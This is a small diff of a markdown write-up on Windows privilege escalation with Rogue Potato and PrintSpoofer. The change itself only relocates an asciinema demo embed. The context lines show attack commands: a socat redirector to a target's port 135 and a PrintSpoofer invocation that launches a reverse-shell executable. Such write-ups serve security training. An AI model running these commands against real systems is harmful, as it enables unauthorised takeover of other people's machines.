@@ -58,8 +58,6 @@ sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.67.56:9999
 ```
 Here the IP is the Windows IP which we are trying to crack into.
 
-[![asciicast](https://asciinema.org/a/14.png)](https://asciinema.org/a/14)
-
 ![Rogue Potato in action](./files/Rogue.png)
 ------------------------------------------------------
 
@@ -78,3 +76,6 @@ PrintSpoofer.exe -i -c rev.exe
 ```
 
 ![PrintSpoofer.exe](./files/printspoofer.png)
+
+
+<a href="https://asciinema.org/a/14?autoplay=1"><img src="https://asciinema.org/a/14.png" width="836"/></a>
